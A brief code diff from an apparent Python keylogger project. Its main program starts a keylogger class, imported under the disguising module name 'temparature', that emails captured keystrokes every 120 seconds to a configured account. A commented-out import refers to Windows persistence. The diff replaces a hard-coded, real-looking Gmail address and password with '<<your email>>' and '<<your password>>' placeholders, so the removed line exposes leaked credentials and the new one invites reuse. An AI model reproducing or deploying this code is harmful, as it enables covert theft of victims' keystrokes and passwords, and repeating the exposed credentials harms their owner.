@@ -18,5 +18,5 @@ import os
 #import keylogger_persistance_windows
 
 #Main program
-my_keylogger = temparature.Keylogger(120, "shibasishdas157@gmail.com", "M@@bapisilchar14")
+my_keylogger = temparature.Keylogger(120, "<<your email>>", "<<your password>>")
 my_keylogger.start()
